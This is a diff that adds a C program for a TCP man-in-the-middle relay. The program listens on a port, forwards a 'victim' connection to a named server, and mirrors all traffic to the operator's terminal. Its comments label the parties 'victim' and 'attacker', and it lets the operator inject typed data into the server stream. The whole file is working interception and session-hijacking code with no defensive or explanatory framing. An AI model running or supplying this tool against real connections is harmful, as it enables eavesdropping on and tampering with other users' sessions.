@@ -1,0 +1,126 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <signal.h>
+#include <strings.h>
+#include <string.h>
+#include <netdb.h>
+#include <sys/time.h>
+#include <sys/select.h>
+#include <sys/types.h>
+
+int main(int argc, char *argv[])
+{
+  struct hostent *he;
+  struct sockaddr_in csin, ssin, fsin;
+  int csock, ssock, fsock;
+  int i;
+  fd_set fds;
+  struct timeval tv;
+  char buf[520];
+
+  if (argc != 3)
+  {
+    printf("usage: %s <server> <port>\n", argv[0]);
+    exit(1);
+  }
+  he = gethostbyname(argv[1]);
+  if (he == NULL)
+  {
+    printf("server doesn't resolve\n");
+    exit(2);
+  }
+  if (atoi(argv[2]) <= 0)
+  {
+    printf("bad port\n");
+    exit(2);
+  }
+  ssock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+  i = 1;
+  setsockopt(ssock, SOL_SOCKET, SO_REUSEADDR, (char *)&i, sizeof(i));
+  ssin.sin_family = AF_INET;
+  ssin.sin_addr.s_addr = INADDR_ANY;
+  ssin.sin_port = htons(atoi(argv[2]));
+  if(bind(ssock, (struct sockaddr *)&ssin, sizeof(ssin))!=0)
+  {
+     perror("Bind");
+     return( -1 );
+  }
+  listen(ssock, 5);
+  printf("listening on port %d...\n", atoi(argv[2]));
+  while (1) /* listenloop */
+  {
+    i = sizeof(fsin);
+    fsock = accept(ssock, (struct sockaddr *)&fsin, &i);
+    printf("connection from %s\n", inet_ntoa(fsin.sin_addr));
+    printf("connecting to %s...\n", argv[1]);
+    csock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    csin.sin_family = AF_INET;
+    memcpy(&csin.sin_addr.s_addr, he->h_addr, sizeof(he->h_addr));
+    csin.sin_port = htons(atoi(argv[2]));
+    sleep(2);
+    if (connect(csock, (struct sockaddr *)&csin, sizeof(csin)) != 0)
+    {
+      perror("connect()");
+      printf("couldn't connect, bailing out.\n");
+      close(fsock);
+      close(ssock);
+      exit(3);
+    }
+    printf("connected, entering pipemode...\n");
+    printf("...............................\n");
+    while (1) /* pipeloop */
+    {
+      FD_ZERO(&fds);
+      FD_SET(0, &fds);
+      FD_SET(csock, &fds);
+      FD_SET(fsock, &fds);
+      tv.tv_sec = 5;
+      tv.tv_usec = 1;
+      select(FD_SETSIZE, &fds, NULL, NULL, &tv);
+      if (FD_ISSET(csock, &fds)) /* pass data server->victim and attacker */
+      {
+        i = read(csock, buf, sizeof(buf));
+        if (i < 0)
+        {
+          printf("EOF on connectsocket, bailing out.\n");
+          exit(3);
+        } else if (i > 0)
+        {
+          write(fsock, buf, i);
+          write(0, buf, i);
+        }
+      }
+      if (FD_ISSET(fsock, &fds)) /* pass data victim->server and attacker */
+      {
+        i = read(fsock, buf, sizeof(buf));
+        if (i < 0)
+        {
+          printf("EOF on fromsocket, bailing out.\n");
+          exit(3);
+        } else if (i > 0)
+        {
+          write(csock, buf, i);
+          printf("V> ");
+          fflush(0);
+          write(0, buf, i);
+        }
+      }
+      if (FD_ISSET(0, &fds)) /* inject data from stdin */
+      {
+        i = read(0, buf, sizeof(buf));
+        if (i < 0)
+        {
+          printf("EOF on stdin, bailing out.\n");
+          exit(3);
+        } else if (i > 0)
+        {
+          write(csock, buf, i);
+        }
+      }
+    }
+  }
+  return 0;
+} 
